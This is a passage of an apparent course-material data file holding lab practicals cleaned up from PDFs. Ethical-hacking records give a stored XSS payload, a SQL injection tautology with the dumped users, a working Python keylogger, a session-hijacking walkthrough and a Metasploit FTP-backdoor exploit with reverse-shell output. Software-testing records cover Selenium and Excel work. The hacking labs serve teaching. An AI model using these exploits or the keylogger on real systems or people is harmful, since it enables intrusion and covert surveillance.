./xampp-linux64-8.1.25-0-installer.run
mv dvwa /opt/lampp/htdocs
ed /opt/ampp
./lampp start`,
    expected_output: 'Stored XSS guestbook entry is saved in the DVWA database and executes whenever the XSS (Stored) page is loaded.',
    algorithm_steps: [],
    procedure_steps: [
      'Step 1: Open the browser, search for DVWA GitHub, and open https://github.com/digininja/DVWA.git.',
      'Step 2: Click the green "<> Code" button and copy the HTTPS clone URL.',
      'Step 3: Open the Kali Linux terminal and run `sudo git clone https://github.com/digininja/DVWA.git`.',
      'Step 4: Open the browser, search for XAMPP for Linux download, and download the installer.',
      'Step 5: In the terminal, navigate to `Downloads` and run `ls` to verify the XAMPP installer file.',
      'Step 6: Grant executable permissions: `chmod 777 xampp-linux-x64-8.1.25-0-installer.run`.',
      'Step 7: Run the installer: `sudo ./xampp-linux-x64-8.1.25-0-installer.run`.',
      'Step 8: Once installed, move DVWA into the web root: `sudo mv DVWA /opt/lampp/htdocs/dvwa`.',
      'Step 9: Change directory to `/opt/lampp` (`cd /opt/lampp`) and start XAMPP services: `sudo ./lampp start`.',
      'Step 10: Open `http://localhost/dvwa` (or `http://127.0.0.1:42001`) in the browser.',
      'Step 11: Navigate to "DVWA Security" in the left sidebar, set the Security Level to "Low", and click Submit.',
      'Step 12: Click on "XSS (Stored)" in the left navigation menu.',
      'Step 13: Enter a name in the "Name *" field and a script/message payload (e.g., `<script>alert("XSS")</script>`) in the "Message *" field, then click "Sign Guestbook".'
    ],
    instructions: 'Fixed PDF typos (`ed /opt/ampp` -> `cd /opt/lampp` as shown in the terminal screenshot on page 19).',
    keywords: ['xss', 'stored xss', 'persistent cross-site scripting', 'dvwa', 'damn vulnerable web application', 'xampp', 'lampp', 'guestbook'],
    aliases: ['EH Practical 6', 'Persistent XSS Attack DVWA'],
    source_pdf: 'final_ethical_hacking_607197eb.pdf',
    source_pages: [1, 17, 18, 19, 20],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220207',
    source_key: 'eh-prac-07',
    subject_id: '11111111-1111-4111-8111-111111111102',
    subject_name: 'Ethical Hacking',
    subject_slug: 'ethical-hacking',
    practical_number: 7,
    title: 'Session Impersonation with Firefox, Tamper Data, and Cookie-Editor',
    original_question: 'SESSION IMPERSONATION WITH FIREFOX AND TAMPER DATA',
    programming_language: 'Web Security (Firefox Add-ons)',
    corrected_code: null,
    original_code: null,
    expected_output: 'Session hijacking succeeds: after deleting browser cookies and injecting the captured PHPSESSID cookie value, navigating to http://www.techpanda.org/dashboard.php grants authenticated access to the Personal Contacts Manager dashboard.',
    algorithm_steps: [],
    procedure_steps: [
      'Step 1: Install and open Mozilla Firefox, go to Add-ons (addons.mozilla.org), search for "Tamper Data for FF Quantum", and add it.',
      'Step 2: Search for "Cookie-Editor" in Firefox Add-ons and install it.',
      'Step 3: Open a new tab and navigate to `http://www.techpanda.org/` (Personal Contacts Manager v1.0).',
      'Step 4: Log in using valid email and password credentials.',
      'Step 5: Click the Cookie-Editor icon in the top-right toolbar and copy the `PHPSESSID` session value (e.g., `PHPSESSID=bd04d1748462014bfb261c47d2a7c6a7` / `6ktg3gfoeui6seh7gqj72aovaqup`).',
      'Step 6: Open Firefox Settings -> Privacy & Security (`about:preferences#privacy`) and clear browsing data and cookies.',
      'Step 7: Open Tamper Data for FF Quantum, select the request types to intercept (`main_frame`, `xmlhttprequest`), and start tampering.',
      'Step 8: Navigate to `http://www.techpanda.org/` in Firefox.',
      'Step 9: On `index.php`, paste the copied `PHPSESSID` value into the Cookie-Editor / intercepted request header and click OK/Save.',
      'Step 10: Inspect the intercepted HTTP request details and headers in Tamper Data.',
      'Step 11: Navigate to `http://www.techpanda.org/dashboard.php` (written as Facebook.com/dashboard.php in PDF text, while the screenshot shows the TechPanda Personal Contacts table) to verify automatic authenticated access without logging in.'
    ],
    instructions: 'Note: In the source PDF, Step 10 text is truncated ("Step 10: then") and Step 11 text mentions "https://www.Facebook.com/dashboard.php" while the screenshot shows the Personal Contacts Manager dashboard from techpanda.org.',
    keywords: ['session impersonation', 'session hijacking', 'firefox', 'tamper data', 'cookie-editor', 'phpsessid', 'techpanda.org', 'cookies'],
    aliases: ['EH Practical 7', 'Session Impersonation with Firefox and Tamper Data'],
    source_pdf: 'final_ethical_hacking_607197eb.pdf',
    source_pages: [1, 21, 22, 23, 24],
    verification_status: 'verified_original',
    review_required: true
  },
  {
    id: '22222222-2222-4222-8222-222222220208',
    source_key: 'eh-prac-08',
    subject_id: '11111111-1111-4111-8111-111111111102',
    subject_name: 'Ethical Hacking',
    subject_slug: 'ethical-hacking',
    practical_number: 8,
    title: 'SQL Injection Attack on DVWA',
    original_question: 'SQL INJECTION ATTACK',
    programming_language: 'SQL / Bash (DVWA)',
    corrected_code: `# SQL Injection Payloads tested in DVWA (Step 14 - Step 16):
# Test 1 (Single user lookup):
1

# Test 2 (Boolean expression):
1=1

# Test 3 (Authentication / Tautology bypass dumping all users):
1' OR '1'='1'#`,
    original_code: `1
1=1
1°OR’1’=’1’#`,
    expected_output: `ID: 1' OR '1'='1'#
First name: admin
Surname: admin

ID: 1' OR '1'='1'#
First name: Gordon
Surname: Brown

ID: 1' OR '1'='1'#
First name: Hack
Surname: Me

ID: 1' OR '1'='1'#
First name: Pablo
Surname: Picasso

ID: 1' OR '1'='1'#
First name: Bob
Surname: Smith`,
    algorithm_steps: [],
    procedure_steps: [
      'Step 1–4: Clone DVWA in Kali Linux terminal: `sudo git clone https://github.com/digininja/DVWA.git`.',
      'Step 5–8: Download XAMPP for Linux, navigate to `Downloads`, run `chmod 777 xampp-linux-x64-8.1.25-0-installer.run`, and install with `./xampp-linux-x64-8.1.25-0-installer.run`.',
      'Step 9–10: Move DVWA to XAMPP web root (`mv DVWA /opt/lampp/htdocs`) and start XAMPP (`cd /opt/lampp && ./lampp start`).',
      'Step 11–12: Open `http://localhost/dvwa`, go to "DVWA Security", set Security Level to "Low", and click Submit.',
      'Step 13: Click on "SQL Injection" in the left menu.',
      'Step 14: Enter `1` in the User ID text box and click Submit (returns First name: admin, Surname: admin).',
      'Step 15: Enter `1=1` in the User ID text box and click Submit.',
      'Step 16: Enter `1\' OR \'1\'=\'1\'#` in the User ID text box and click Submit to dump all user records from the database.'
    ],
    instructions: 'Fixed OCR typo in Step 16 payload (`1°OR’1’=’1’#` -> `1\' OR \'1\'=\'1\'#`) to match the actual DVWA input screenshot on page 29.',
    keywords: ['sql injection', 'sqli', 'dvwa', '1\' or \'1\'=\'1\'#', 'tautology', 'xampp', 'database dump', 'admin'],
    aliases: ['EH Practical 8', 'SQL Injection Attack DVWA'],
    source_pdf: 'final_ethical_hacking_607197eb.pdf',
    source_pages: [1, 25, 26, 27, 28, 29],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220209',
    source_key: 'eh-prac-09',
    subject_id: '11111111-1111-4111-8111-111111111102',
    subject_name: 'Ethical Hacking',
    subject_slug: 'ethical-hacking',
    practical_number: 9,
    title: 'Creating a Keylogger with Python (pynput)',
    original_question: 'CREATING A KEYLOGGER WITH PYTHON',
    programming_language: 'Python',
    corrected_code: `import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)
    try:
        print("alphanumeric key {0} pressed".format(key.char))
    except AttributeError:
        print("Special key {0} pressed".format(key))

def write_file(keys):
    with open("key.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
            f.write(" ")

def on_release(key):
    print("{0} release".format(key))
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()`,
    original_code: `import
pynput
frompynput.keyboard import key,Listener
keys = [] defon_press(key):
keys.append(key) write_file(keys) try:
print("alphanumeric key {0} pressd".format(key.char)) except
AttributeError:
print("Special key {0} pressd".format(key))
defwrite_file(keys): with
open("key.txt","w") as f: for key in keys:
k= str(key).replace(""", "")
f.write(k)
f.write("") defon_release(key):
print("{0} release".format(key)) if
key = key.ese:
return False with Listener
(on_press=on_press,on_release=on_release) as listner:
listner,join()`,
    expected_output: `codedwithajay Key.space Key.space patidar`,
    algorithm_steps: [
      'Install the pynput library using `pip install pynput`.',
      'Import Key and Listener from pynput.keyboard and initialize an empty list `keys = []`.',
      'Define `on_press(key)` callback to append each keystroke to `keys`, write the buffer to `key.txt`, and log the key to console.',
      'Define `write_file(keys)` to strip single quotes from each key string and write to `key.txt`.',
      'Define `on_release(key)` to stop the listener (`return False`) when `Key.esc` is pressed.',
      'Start the keyboard `Listener(on_press=on_press, on_release=on_release)` and call `listener.join()`.'
    ],
    procedure_steps: [
      'Step 1: Open PyCharm or terminal and install pynput: `pip install pynput`.',
      'Step 2: Create a Python script (`key_logger_first.py`), paste the keylogger code, run it, type sample text, and inspect the generated `key.txt` output file.'
    ],
    instructions: 'Requires `pip install pynput`. Fixed multiple syntax errors from pages 30–31 of the PDF: `frompynput.keyboard import key,Listener` -> `from pynput.keyboard import Key, Listener`, `defon_press` -> `def on_press`, `.replace(""", "")` -> `.replace("\'", "")`, `if key = key.ese:` -> `if key == Key.esc:`, and `listner,join()` -> `listener.join()`.',
    keywords: ['keylogger', 'python keylogger', 'pynput', 'pynput.keyboard', 'listener', 'on_press', 'on_release', 'key.txt'],
    aliases: ['EH Practical 9', 'Python Keylogger using pynput'],
    source_pdf: 'final_ethical_hacking_607197eb.pdf',
    source_pages: [1, 30, 31],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220210',
    source_key: 'eh-prac-10',
    subject_id: '11111111-1111-4111-8111-111111111102',
    subject_name: 'Ethical Hacking',
    subject_slug: 'ethical-hacking',
    practical_number: 10,
    title: 'Exploiting with Metasploit in Kali Linux (Metasploitable 2 FTP Backdoor)',
    original_question: 'EXPLOITING WITH METASPLOIT (KALI LINUX)',
    programming_language: 'Bash / Metasploit CLI',
    corrected_code: `# Step 7-8: Discover Metasploitable IP address on NAT network
sudo su
netdiscover

# Step 10: Scan open services and versions on target machine
nmap -sV 192.168.247.136

# Step 14-21: Launch Metasploit Framework Console and run FTP backdoor exploit
msfconsole
search Backdoor Command Execution
use 3
# (Selects exploit/unix/ftp/proftpd_133c_backdoor or exploit/unix/ftp/vsftpd_234_backdoor)
show options
set RHOSTS 192.168.247.136
set payload cmd/unix/reverse
set LHOST 192.168.247.131
options
exploit
ls`,
    original_code: `sudo su
netdiscover
nmap -sV 192.168. 152.128
msfconsole
search Backdoor Command Execution
use 3
show options
set RHOST 192.168.247.136
set payload cmd/unix/reverse
set LHOST 192.168.154.128
exploit`,
    expected_output: `[*] 192.168.247.136:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.247.136:21 - USER: 331 Please specify the password.
[+] 192.168.247.136:21 - Backdoor service has been spawned, handling...
[+] 192.168.247.136:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (172.26.204.144:46785 -> 192.168.247.136:6200)

ls
bin  boot  cdrom  dev  etc  home  initrd  initrd.img  lib  lost+found  media  mnt  nohup.out  opt  proc  root  sbin  srv  sys  tmp  usr  var  vmlinuz`,
    algorithm_steps: [],
    procedure_steps: [
      'Step 1–4: Download the Metasploitable 2 virtual machine from SourceForge (https://sourceforge.net/projects/metasploitable/) and open `Metasploitable.vmx` in VMware Workstation.',
      'Step 5: Log in to Metasploitable 2 using username `msfadmin` and password `msfadmin`.',
      'Step 6–8: Open Kali Linux terminal, run `sudo su`, and run `netdiscover` to identify the Metasploitable IP address on the NAT subnet (e.g., `192.168.247.136`).',
      'Step 9: Open the discovered IP address in Chrome to verify the Metasploitable 2 web page.',
      'Step 10–11: Run `nmap -sV 192.168.247.136` to enumerate open ports and service versions (e.g., port 21/tcp `vsftpd 2.3.4` and port 2121/tcp `ProFTPD 1.3.1`).',
      'Step 12–13: Search Exploit-DB for the FTP backdoor exploit (`ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)`).',
      'Step 14: Open the Kali terminal and start Metasploit using `msfconsole`.',
      'Step 15: Run `search Backdoor Command Execution` inside `msfconsole`.',
      'Step 16: Select the exploit module using `use 3` (`exploit/unix/ftp/proftpd_133c_backdoor` or `use exploit/unix/ftp/vsftpd_234_backdoor`).',
      'Step 17: Run `show options` to view required module parameters.',
      'Step 18: Set the target IP address using `set RHOSTS 192.168.247.136` and run `options` to verify.',
      'Step 19: Set the reverse shell payload using `set payload cmd/unix/reverse`.',
      'Step 20: Set the Kali attacker IP address using `set LHOST 192.168.247.131`.',
      'Step 21: Run `exploit` to spawn a root command shell session (`uid=0(root)`) on the Metasploitable machine and run `ls`.'
    ],
    instructions: 'Note: In the PDF screenshots (pages 36-38), Steps 16-20 demonstrate configuring `exploit/unix/ftp/proftpd_133c_backdoor`, while the final output screenshot on page 38 shows the shell session obtained via `exploit/unix/ftp/vsftpd_234_backdoor` on port 21.',
    keywords: ['metasploit', 'msfconsole', 'metasploitable', 'kali linux', 'proftpd', 'vsftpd', 'backdoor', 'rhost', 'lhost', 'netdiscover', 'nmap -sv'],
    aliases: ['EH Practical 10', 'Exploiting with Metasploit Kali Linux'],
    source_pdf: 'final_ethical_hacking_607197eb.pdf',
    source_pages: [1, 32, 33, 34, 35, 36, 37, 38],
    verification_status: 'verified_corrected',
    review_required: false
  },

  // ============================================================================
  // SUBJECT 3: SOFTWARE TESTING AND QUALITY ASSURANCE (10 Practicals)
  // ============================================================================
  {
    id: '22222222-2222-4222-8222-222222220301',
    source_key: 'stqa-prac-01',
    subject_id: '11111111-1111-4111-8111-111111111103',
    subject_name: 'Software Testing and Quality Assurance',
    subject_slug: 'software-testing-and-quality-assurance',
    practical_number: 1,
    title: 'Install Selenium IDE and Create a Test Suite with 4 Test Cases',
    original_question: 'Install Selenium IDE and create a test suite containing a minimum of 4 test cases for different web page formats (e.g., HTML, XML, JSON, etc.).',
    programming_language: 'Selenium IDE',
    corrected_code: null,
    original_code: null,
    expected_output: 'Test cases (Mercury Tours, youtube, Yahoo, Google) recorded, saved as a .side project file (SQTA Prac1.side), and executed with "completed successfully" in the Selenium IDE log.',
    algorithm_steps: [],
    procedure_steps: [
      'Step 1: Install Mozilla Firefox if not already installed.',
      'Step 2: Open URL `https://addons.mozilla.org/en-US/firefox/addon/selenium-ide/`.',
      'Step 3: Click the "Add to Firefox" / Add Extension button to install Selenium IDE.',
      'Step 4–5: Click the Extensions (puzzle piece) icon in the top-right corner of Firefox and launch Selenium IDE.',
      'Step 6–7: In the welcome dialog, click "Create a new project".',
      'Step 8: Name the project `SQTA Prac1` and click OK.',
      'Step 9: Enter the Base URL `http://demo.guru99.com/test/newtours/` and click Start Recording (toggle Record on if not already active).',
      'Step 10–11: When the Mercury Tours page opens, right-click on the page -> Select `Selenium IDE` -> `Assert` -> `Title`.',
      'Step 12: In the "User Name" field type `invalidUNN`, and in the "Password" field type `invalidPWD`.',
      'Step 13: Click the "Submit" / "Sign-In" button.',
      'Step 14–16: Stop recording, save the test case as `youtube` (saved with `.side` extension).',
      'Step 17: Click the Playback (Run current test) button in Selenium IDE to replay and verify all recorded steps.',
      'Step 18–21: Repeat the recording and playback process for 3 additional websites (`http://www.youtube.com`, `https://www.yahoo.in`, and `https://www.google.com`) to complete the 4-test-case suite.'
    ],
    instructions: 'Requires Mozilla Firefox and the Selenium IDE browser extension.',
    keywords: ['selenium ide', 'test suite', '4 test cases', 'firefox extension', 'mercury tours', 'guru99', '.side', 'record and playback'],
    aliases: ['STQA Practical 1', 'Install Selenium IDE and Create a Test Suite'],
    source_pdf: 'final_STQA_b89bf2f3.pdf',
    source_pages: [1, 2, 3, 4, 5, 6],
    verification_status: 'verified_original',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220302',
    source_key: 'stqa-prac-02',
    subject_id: '11111111-1111-4111-8111-111111111103',
    subject_name: 'Software Testing and Quality Assurance',
    subject_slug: 'software-testing-and-quality-assurance',
    practical_number: 2,
    title: 'Conduct a Test Suite Using Selenium IDE (Assert & Verify Commands)',
    original_question: 'Conduct a test suite for two different websites using Selenium IDE. Perform various actions like clicking links, filling forms, and verifying content',
    programming_language: 'Selenium IDE',
    corrected_code: null,
    original_code: null,
    expected_output: 'Valid test cases (valid_assert_title, valid_verify_title, valid_assert_text, valid_verify_text, verify_element_present) pass with green checkmarks; invalid test cases (with modified value "Selenese") fail as expected in the Selenium IDE log.',
    algorithm_steps: [],
    procedure_steps: [
      '--- Part 1: Checking Assert Title Command ---',
      'Step 1–2: Open Mozilla Firefox and launch Selenium IDE (Project: `STQA Prac2`).',
      'Step 3: Enter Base URL `https://www.google.com/` and start recording.',
      'Step 4: Search `"selenium IDE"` in the Google search bar.',
      'Step 5: Click the first result link leading to the Selenium IDE page.',
      'Step 6: Right-click on the page -> Selenium IDE -> Assert -> Title.',
      'Step 7: Stop recording and save the test case as `valid_assert_title`.',
      'Step 8–9: Create a new test case named `invalid_assert_title`, repeat Steps 3–6, and modify the expected title value so the assertion fails.',
      '--- Part 2: Checking Verify Title Command ---',
      'Step 1–3: Create test cases `valid_verify_title` and `invalid_verify_title` by repeating Steps 3–6, selecting `Verify -> Title` instead of `Assert -> Title`.',
      '--- Part 3: Checking Assert Text Command ---',
      'Step 1–4: Create a new test `valid_assert_text`, start recording at `https://www.google.com/`, search `"Selenium IDE"`, and open the first link.',
      'Step 5–6: Highlight the heading text on the page, right-click -> Selenium IDE -> Assert -> Text, then stop recording and save.',
      'Step 7–11: Create `invalid_assert_text`, repeat Steps 1–4, add Assert Text, change the Value field from `Selenium IDE` to `Selenese`, stop recording, and run.',
      '--- Part 4: Checking Verify Text Command ---',
      'Step 1–4: Repeat the steps for Assert Text using `Verify -> Text` to create `valid_verify_text` and `invalid_verify_text` (changing Value to `Selenese`).',
      '--- Part 5: Checking Verify Element Present ---',
      'Step 1–4: Create a test case named `verify_element_present`, record navigating to the Selenium IDE page, right-click an element -> Selenium IDE -> Verify -> Element Present, stop recording, and run the test.',
      'Step 5–6: Create `invalid_verify_element_present` with a modified target selector and run to observe the failure log.'
    ],
    instructions: 'Demonstrates the difference between Assert (stops test execution on failure) and Verify (logs failure and continues execution) in Selenium IDE.',
    keywords: ['selenium ide', 'assert title', 'verify title', 'assert text', 'verify text', 'verify element present', 'selenese', 'test suite'],
    aliases: ['STQA Practical 2', 'Selenium IDE Assert and Verify Commands'],
    source_pdf: 'final_STQA_b89bf2f3.pdf',
    source_pages: [1, 7, 8, 9, 10, 11, 12],
    verification_status: 'verified_original',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220303',
    source_key: 'stqa-prac-03',
    subject_id: '11111111-1111-4111-8111-111111111103',
    subject_name: 'Software Testing and Quality Assurance',
    subject_slug: 'software-testing-and-quality-assurance',
    practical_number: 3,
    title: 'Install Selenium Server (Selenium RC / WebDriver) in Eclipse IDE',
    original_question: 'Install Selenium Server (Selenium RC) and demonstrate its usage by executing a script in Java or PHP to automate browser actions.',
    programming_language: 'Java (Eclipse Setup)',
    corrected_code: null,
    original_code: null,
    expected_output: 'Eclipse Java project ("Project4" / "BrowserStack" package) configured with Selenium Client Combined 3.141.59 JARs and dependencies on the Java Build Path.',
    algorithm_steps: [],
    procedure_steps: [
      'Step 1: Download Java SE Development Kit (JDK) installer according to your Windows platform.',
      'Step 2: Run the Windows x64 JDK installer and follow the setup wizard instructions.',
      'Step 3: Download and install Eclipse IDE for Java Developers.',
      'Step 4: Download the Selenium Server / Selenium Client & WebDriver Java Language Bindings.',
      'Step 5: Download browser driver executables (ChromeDriver for Chrome, GeckoDriver for Firefox, SafariDriver, IEDriverServer, MSEdgeDriver) and add their directory to the system PATH.',
      'Step 6: Extract the Selenium Java Language Bindings (`selenium-java-3.141.59.zip`).',
      'Step 7–8: Launch `eclipse.exe` from the installation folder.',
      'Step 9: Create and launch an Eclipse workspace (e.g., `C:\\BrowserStack` or `C:\\Users\\DELL\\eclipse-workspace`).',
      'Step 10: In Eclipse, click `File -> New -> Java Project` and enter a project name (e.g., `Project4`).',
      'Step 11: Right-click the `src` folder -> `New -> Package`, and name it `BrowserStack`.',
      'Step 12: Right-click the `BrowserStack` package -> `New -> Class`, enter class name `Project`, check `public static void main(String[] args)`, and click Finish.',
      'Step 13: Right-click the project folder -> `Properties -> Java Build Path -> Libraries -> Classpath -> Add External JARs...`, select `client-combined-3.141.59.jar` and all JARs inside the `libs` folder (`byte-buddy`, `commons-exec`, `guava`, `okhttp`, `okio`), and click `Apply and Close`.'
    ],
    instructions: 'Note: Practical 3 in the PDF covers the complete installation and build-path configuration of JDK, Eclipse, GeckoDriver, and Selenium JARs; the first executable Java WebDriver script follows immediately in Practical 4.',
    keywords: ['selenium server', 'selenium rc', 'eclipse ide', 'java build path', 'client-combined-3.141.59.jar', 'geckodriver', 'chromedriver', 'jdk'],
    aliases: ['STQA Practical 3', 'Install Selenium Server and Configure Eclipse'],
    source_pdf: 'final_STQA_b89bf2f3.pdf',
    source_pages: [1, 13, 14, 15, 16],
    verification_status: 'verified_original',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220304',
    source_key: 'stqa-prac-04',
    subject_id: '11111111-1111-4111-8111-111111111103',
    subject_name: 'Software Testing and Quality Assurance',
    subject_slug: 'software-testing-and-quality-assurance',
    practical_number: 4,
    title: 'Selenium WebDriver Program to Automate Web Page Login',
    original_question: 'Write a program using Selenium WebDriver to automate the login process on a specific web page. Verify successful login with appropriate assertions',
    programming_language: 'Java',
    corrected_code: `package Prac3;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.firefox.FirefoxDriver;

public class P3 {
    public static void main(String[] args) throws InterruptedException {
        System.setProperty(
            "webdriver.gecko.driver",
            "D:\\\\STQA\\\\Mozilla Driver-20230927T030950Z-001\\\\Mozilla Driver\\\\geckodriver.exe"
        );

        WebDriver driver = new FirefoxDriver();
        driver.get("https://accounts.google.com/");

        driver.findElement(By.id("identifierId"))
            .sendKeys("debo123@gmail.com"); // enter username
        driver.findElement(By.id("identifierNext")).click();

        Thread.sleep(500);

        driver.findElement(By.name("password"))
            .sendKeys("TYPE_YOUR_PASSWORD"); // enter password
        driver.findElement(By.id("passwordNext")).click();

        String title = driver.getTitle();
        if (title.equals("Google Account")) {
            System.out.println("LOGIN SUCCESSFUL...");
        } else {
            System.out.println("LOGIN FAILED");
        }
    }
}`,
    original_code: `package Prac3; import org.openqa.selenium.By; import
org.openqa.selenium.WebDriver; import
org.openqa.selenium.firefox.FirefoxDriver; public class P3 {
public static void main(String[] args) throws InterruptedException {
System.setProperty(
"webdriver.gecko.driver",
"D:\\\\STQA\\\\Mozilla Driver-20230927T030950Z-001\\\\Mozilla
Driver\\\\geckodriver.exe"
);
WebDriver driver = new FirefoxDriver();
Driver.get("https://accounts.google.com/"); driver.findElement(By.id("identifierId"))
.sendKeys("debo123@gmail.com"); // enter username
driver.findElement(By.id("identifierNext")).click();
Thread.sleep(500) driver.findElement(By.name("password"))
.sendKeys("TYPE_YOUR_PASSWORD"); // enter password
driver.findElement(By.id("passwordNext")).click(); String title =
driver.getTitle() if (title.equals("Google Account")) {
System.out.println("LOGIN SUCCESSFUL...");
} else {
System.out.println("LOGIN FAILED");
}
}
}`,
    expected_output: `Firefox opens https://accounts.google.com/, fills the email identifier field, clicks Next, and prints "LOGIN SUCCESSFUL..." or "LOGIN FAILED" based on driver.getTitle().`,
    algorithm_steps: [
      'Configure the GeckoDriver system property `webdriver.gecko.driver` pointing to `geckodriver.exe`.',
      'Instantiate `WebDriver driver = new FirefoxDriver()` and navigate to `https://accounts.google.com/`.',
      'Locate the email input via `By.id("identifierId")`, send the email string, and click `By.id("identifierNext")`.',
      'Wait briefly (`Thread.sleep(500)`), locate `By.name("password")`, send the password, and click `By.id("passwordNext")`.',
      'Retrieve the page title via `driver.getTitle()` and assert whether it equals `"Google Account"`.'
    ],
    procedure_steps: [],
    instructions: 'Conservatively fixed three Java syntax errors present in the PDF on page 17: `Driver.get(...)` (capital D) corrected to `driver.get(...)`, and added missing semicolons after `Thread.sleep(500);` and `String title = driver.getTitle();`.',
    keywords: ['selenium webdriver', 'automate login', 'firefoxdriver', 'geckodriver', 'by.id', 'identifierid', 'sendkeys', 'gettitle', 'java'],
    aliases: ['STQA Practical 4', 'Selenium WebDriver Login Automation Java'],
    source_pdf: 'final_STQA_b89bf2f3.pdf',
    source_pages: [1, 17, 18],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220305',
    source_key: 'stqa-prac-05',
    subject_id: '11111111-1111-4111-8111-111111111103',
    subject_name: 'Software Testing and Quality Assurance',
    subject_slug: 'software-testing-and-quality-assurance',
    practical_number: 5,
    title: 'Program to Update 10 Student Records in an Excel File (JXL API)',
    original_question: 'Write a program using Selenium WebDriver to update 10 student records in an Excel file. Perform data manipulation and verification.',
    programming_language: 'Java',
    corrected_code: `import java.io.File;
import jxl.Sheet;
import jxl.Workbook;
import jxl.write.Label;
import jxl.write.WritableSheet;
import jxl.write.WritableWorkbook;

public class Result {
    public static void main(String[] args) throws Exception {
        Workbook wb = Workbook.getWorkbook(new File("input.xls"));
        Sheet s = wb.getSheet(0);

        WritableWorkbook wwb = Workbook.createWorkbook(new File("output.xls"));
        WritableSheet ws = wwb.createSheet("Result", 0);

        String[][] a = new String[s.getRows()][s.getColumns()];
        for (int i = 0; i < s.getRows(); i++) {
            for (int j = 0; j < s.getColumns(); j++) {
                a[i][j] = s.getCell(j, i).getContents();
                Label l2 = new Label(j, i, a[i][j]);
                ws.addCell(l2);
            }
        }

        Label l1 = new Label(6, 0, "Result");
        ws.addCell(l1);

        for (int i = 1; i < s.getRows(); i++) {
            for (int j = 2; j < s.getColumns(); j++) {
                a[i][j] = s.getCell(j, i).getContents();
                int x = Integer.parseInt(a[i][j]);
                if (x > 35) {
                    Label result = new Label(6, i, "pass");
                    ws.addCell(result);
                } else {
                    Label result = new Label(6, i, "fail");
                    ws.addCell(result);
                    break;
                }
            }
        }

        System.out.println("Records successfully updated");

        // Save the Excel file
        wwb.write();

        // Close files
        wwb.close();
        wb.close();
    }
}`,
    original_code: `import java.io.File; import
jxl.Sheet; import jxl.Workbook;
import jxl.write.Label; import
jxl.write.WritableSheet; import
jxl.write.WritableWorkbook;
public class Result {
public static void main(String[] args) throws Exception {
Workbook wb = Workbook.getWorkbook(new File("input.xls"));
Sheet s = wb.getSheet(0);
WritableWorkbookwwb =
Workbook.createWorkbook(new File("output.xls"));
WritableSheet ws = wwb.createSheet("Result", 0);
String[[] a = new String[s.getRows()][s.getColumns()]; for
(int i = 0; i < s.getRows(); i++) { for (int j = 0; j <
s.getColumns(); j++) { a[i][j] = s.getCell(j,
i).getContents(); Label l2 = new Label(j, i, a[i][j]);
ws.addCell(l2);
}
}
Label l1 = new Label(6, 0, "Result");
ws.addCell(l1); for (int i = 1; i <
s.getRows(); i++) {
for (int j = 2; j < s.getColumns(); j++) {
a[i][j] = s.getCell(j, i).getContents();
int x = Integer.parseInt(a[i][j]);
if (x > 35) {
Label result = new Label(6, i, "pass");
ws.addCell(result);
} else {
Label result = new Label(6, i, "fail");
ws.addCell(result);
break; }
}
}
System.out.println("Records successfully updated");
// Save the Excel file
wwb.write();
// Close files
wwb.close();
wb.close();
}
}`,
    expected_output: `Records successfully updated
(Generates output.xls with 10 student rows [Roll No, Java, DBMS, OS, Total] and a new "Result" column showing "pass" or "fail" for each student).`,
    algorithm_steps: [
      'Open `input.xls` using `Workbook.getWorkbook(new File("input.xls"))` and read sheet 0.',
      'Create `output.xls` using `Workbook.createWorkbook(new File("output.xls"))` and create sheet `"Result"`.',
      'Copy all existing cells `(j, i)` from `input.xls` into `output.xls`.',
      'Add a header `Label(6, 0, "Result")` in column 6.',
      'For each student row `i >= 1`, inspect subject score columns `j >= 2`: if `x > 35` write `"pass"`, else write `"fail"` and break out of the inner loop.',
      'Write and close the workbook (`wwb.write()`, `wwb.close()`, `wb.close()`).'
    ],
    procedure_steps: [
      'Step 1: Download the `jxl.jar` library from `https://sourceforge.net/projects/jexcelapi/` (`jexc`).',
      'Step 2: Create an Excel file `input.xls` (in `.xls` 97-2003 format) containing 10 student records (`Roll No`, `Java`, `DBMS`, `OS`, `Total`).',
      'Step 3: Install the TestNG plugin in Eclipse via `Help -> Eclipse Marketplace` or `Help -> Install New Software` (`https://testng.org/testng-eclipse-update-site`).',
      'Step 4–7: Create a new Java Project in Eclipse and a class named `Result` (or `StudentRecord`) with `public static void main(String[] args)`.',
      'Step 8–10: Right-click the project -> `Build Path -> Configure Build Path -> Libraries -> Classpath -> Add External JARs`, and add `jxl.jar` and Selenium JARs.',
      'Step 11–14: Paste the code, ensure `input.xls` is in the project root, and run the program to generate `output.xls`.'
    ],
    instructions: 'Requires `jxl.jar` on the classpath and `input.xls` saved in `.xls` format (JXL does not support `.xlsx`). Fixed two typos in the PDF code on page 25: `WritableWorkbookwwb` -> `WritableWorkbook wwb` and `String[[] a` -> `String[][] a`.',
    keywords: ['excel', 'update 10 student records', 'jxl', 'workbook', 'writableworkbook', 'writablesheet', 'input.xls', 'output.xls', 'pass', 'fail'],
    aliases: ['STQA Practical 5', 'Update 10 Student Records in Excel File Java'],
    source_pdf: 'final_STQA_b89bf2f3.pdf',
    source_pages: [1, 19, 20, 21, 22, 23, 24, 25, 26],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220306',
    source_key: 'stqa-prac-06',
    subject_id: '11111111-1111-4111-8111-111111111103',
    subject_name: 'Software Testing and Quality Assurance',
    subject_slug: 'software-testing-and-quality-assurance',
    practical_number: 6,
